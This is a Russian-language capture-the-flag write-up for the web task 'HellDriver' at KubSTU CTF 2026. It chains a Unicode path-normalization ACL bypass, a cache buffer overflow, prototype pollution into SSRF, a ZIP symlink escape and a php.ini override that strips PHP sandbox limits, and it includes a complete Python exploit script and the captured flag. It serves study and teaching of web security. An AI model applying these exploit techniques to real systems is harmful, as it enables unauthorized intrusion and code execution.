# HellDriver

> **Категория:** Web · **Событие:** KubSTU CTF 2026 Autumn · **1000 pts** · **Дата:** 11 октября 2026 года
> Автор задания: [@thxStuck](https://t.me/thankspIuxury) · Infrastructure Administrator: [@ZloyTapochek](https://t.me/ddsddmitriy)
> Командный (пользовательский) райтап команды **GR3B0M4** · Источник: https://ctftime.org/writeup/41136 (CTFtime)

## 📌 Задача

Web-задание на 1000 очков. Приложение состоит из нескольких проксированных сервисов: Caddy на внешнем периметре, бэкенд на FastAPI с внутренними Vault-методами, собственный C-кэш AetherCache и PHP ImageProxy. Флаг можно прочитать, только связав шесть независимых уязвимостей в одну эксплойт-цепочку.

## 🏁 Решение

### TL;DR

В HellDriver нужно было связать шесть небольших уязвимостей в одну цепочку: обойти ACL через расхождение нормализации Unicode, переполнить буфер ключа в AetherCache, превратить cache-entry в доверенные метаданные, загрязнить прототип и получить SSRF, восстановить ZIP через symlink за пределы каталога распаковки и ослабить PHP sandbox через пользовательский `php.ini`.

Итоговая цепочка выглядела так:

```text
Caddy ACL bypass
  → update_meta
  → AetherCache flags = 1
  → prototype pollution
  → SSRF во внутренний restore
  → ZIP symlink escape
  → перезапись php-overrides.ini
  → action=readflag
```

### Разведка

Приложение состояло из нескольких проксированных сервисов: Caddy на внешнем периметре, FastAPI с внутренними Vault-методами, собственный C-кэш AetherCache и PHP ImageProxy. Для финальной цепочки были нужны следующие точки:

| Метод | Endpoint | Назначение |
|---|---|---|
| `POST` | `/api/register` | Создание tenant-сессии |
| `PUT` | `/api/internal/vault/update_meta` | Запись metadata в AetherCache; закрыт ACL |
| `GET` | `/market?meta=...` | Чтение сырой metadata-записи из кэша |
| `POST` | `/api/vault/upload` | Загрузка будущего ZIP |
| `GET` | `/imageproxy/api?action=...` | Запуск PHP в tenant sandbox |

`robots.txt` раскрывал имя защищённой ручки `update_meta`. Обычный запрос до неё стабильно получал Caddy `403`; несуществующий FastAPI-маршрут возвращал JSON `404`. Это позволило чётко отличать блокировку edge от ответа upstream и проверять варианты нормализации пути.

### 1. ACL bypass и переполнение AetherCache

Защищённая ручка существовала по адресу:

```http
PUT /api/internal/vault/update_meta
```

На обычном пути Caddy возвращал `403 Forbidden`. Но edge и upstream по-разному нормализовали Unicode. Если заменить первую `i` в `internal` на dotless i `ı` (`U+0131`), запрос миновал ACL, а backend всё равно выбирал нужный обработчик:

```http
PUT /api/%C4%B1nternal/vault/update_meta
Content-Type: application/json
Cookie: __Host-AV=...

{}
```

Ответ `200 {"ok":true}` подтвердил полноценный bypass: это был не переход `403 → 404`, а попадание в существующий `PUT` endpoint.

`update_meta` сохранял данные под ключом `meta:<symbol>`. Поле `symbol` попадало в фиксированный C-буфер, и начиная с 256-го символа следующие байты перезаписывали 32-битное поле `flags`:

```text
symbol length 255 → flags = 0
symbol length 256, последний байт "A" → flags = 65
symbol = "E" * 255 + "\x01" → flags = 1
```

Ключ кэша ограничивался 255 байтами. Поскольку префикс `meta:` занимает пять байт, читать переполненную запись нужно было по первым 250 символам:

```http
GET /market?meta=EEEE...EEEE   # ровно 250 символов
```

При `flags=1` Market выбирал небезопасную ветку обработки cache-entry (`card-trade-unsafe`).

### 2. Prototype pollution превращается в SSRF

Самой важной деталью было поле `value`: оно должно быть **JSON-строкой**, а не вложенным JSON-объектом. Рабочее значение выглядело так:

```json
{
  "__proto__": {"allowLocalFetch": true},
  "zipPath": "/srv/<tid>/uploads/<uuid>"
}
```

Полный запрос на отравление cache-entry:

```python
meta = "E" * 250
symbol = meta + "E" * 5 + "\x01"
value = json.dumps({
    "__proto__": {"allowLocalFetch": True},
    "zipPath": f"/srv/{tid}/uploads/{stored_as}",
})

session.put(
    BASE + "/api/%C4%B1nternal/vault/update_meta",
    json={"symbol": symbol, "value": value},
)
```

После чтения через `/market?meta=<250-byte-prefix>` приложение разбирало доверенное значение и небезопасно сливало его с конфигурацией. Собственного ключа `allowLocalFetch` в config не было, поэтому чтение проваливалось в загрязнённый прототип. Обычный ключ `zipPath` задавал путь для внутреннего restore-запроса.

Сначала это удобно проверялось несуществующим файлом:

```json
{
  "status": 404,
  "body": "{\"detail\":\"zip not found\"}"
}
```

То есть SSRF уже работал и достигал внутреннего сервиса восстановления.

### 3. ZIP symlink escape и выход из PHP sandbox

Vault принимал ZIP под MIME-типом `text/plain` и возвращал случайное имя:

```json
{"ok":true,"stored_as":"c06666494b504532af55b3005aca0abf"}
```

Прямой Zip Slip блокировался:

```json
{"detail":"unsafe entry: ../php-overrides.ini"}
```

Однако extractor доверял Unix symlink внутри архива. Restore распаковывал файлы в `/srv/<tid>/unzip`, поэтому архив создавал ссылку `escape → ..`, а следующая запись проходила по ней в корень tenant sandbox:

```text
archive.zip
├── escape -> ..
└── escape/php-overrides.ini
```

Содержимое `php-overrides.ini` очищало ограничения:

```ini
open_basedir=
disable_functions=
```

После распаковки файл оказывался по пути `/srv/<tid>/php-overrides.ini`. ImageProxy запускал каждый запрос так:

```text
php -c /srv/<tid>/php-overrides.ini -f /app/imagesvc/index.php
```

Поэтому следующий запрос стартовал PHP уже без `disable_functions`. Действие `readflag` вызывало `/readflag` и возвращало секрет:

```http
GET /imageproxy/api?action=readflag
```

```json
{"ok":true,"flag":"kubstu{69f64633b50fc9b8_0f2d46e5d10371f9}"}
```

### Полный эксплойт

```python
#!/usr/bin/env python3
import io
import json
import re
import stat
import zipfile

import requests

BASE = "https://159.194.249.254:8443"
UPDATE_META = "/api/%C4%B1nternal/vault/update_meta"

requests.packages.urllib3.disable_warnings()
s = requests.Session()
s.verify = False

# Register a tenant.
s.post(BASE + "/api/register", allow_redirects=False).raise_for_status()
tid = s.cookies.get("__Host-AV").split(".", 1)[0]

# Build the symlink archive.
buf = io.BytesIO()
with zipfile.ZipFile(buf, "w", zipfile.ZIP_STORED) as zf:
    link = zipfile.ZipInfo("escape")
    link.create_system = 3
    link.external_attr = (stat.S_IFLNK | 0o777) << 16
    zf.writestr(link, "..")
    zf.writestr("escape/php-overrides.ini", "open_basedir=\ndisable_functions=\n")

# Upload it as an ordinary Vault document.
r = s.post(
    BASE + "/api/vault/upload",
    files={"file": ("restore.txt", buf.getvalue(), "text/plain")},
)
r.raise_for_status()
stored_as = r.json()["stored_as"]

# Overflow cache flags and inject the trusted metadata value.
meta = "E" * 250
symbol = meta + "E" * 5 + "\x01"
value = json.dumps({
    "__proto__": {"allowLocalFetch": True},
    "zipPath": f"/srv/{tid}/uploads/{stored_as}",
})
r = s.put(
    BASE + UPDATE_META,
    json={"symbol": symbol, "value": value},
)
r.raise_for_status()

# Reading the poisoned entry triggers the internal restore.
r = s.get(BASE + "/market", params={"meta": meta}, timeout=20)
r.raise_for_status()
assert "extracted" in r.text

# The overwritten ini enables the final command execution sink.
r = s.get(BASE + "/imageproxy/api", params={"action": "readflag"})
r.raise_for_status()
print(re.search(r"kubstu\{[^}]+\}", r.text).group(0))
```

Вывод:

```text
kubstu{69f64633b50fc9b8_0f2d46e5d10371f9}
```

### Что было важно

- Переход `403 → 404` ещё не доказывает ACL bypass; успешный обход должен попасть в реальный upstream handler.
- На границе языков важно проверять не только длину строки, но и физическое расположение полей структуры. Один байт после `symbol[255]` полностью изменил семантику cache-entry.
- JSON-объект и строка, содержащая JSON, здесь принципиально различались: prototype pollution срабатывал только после второго разбора `value`.
- Проверка имён ZIP-записей без безопасной обработки symlink не предотвращает выход из каталога распаковки.
- Пользовательский `php.ini` — полноценная граница безопасности: возможность переписать его эквивалентна снятию `open_basedir` и `disable_functions`.

**Флаг:** `kubstu{69f64633b50fc9b8_0f2d46e5d10371f9}`
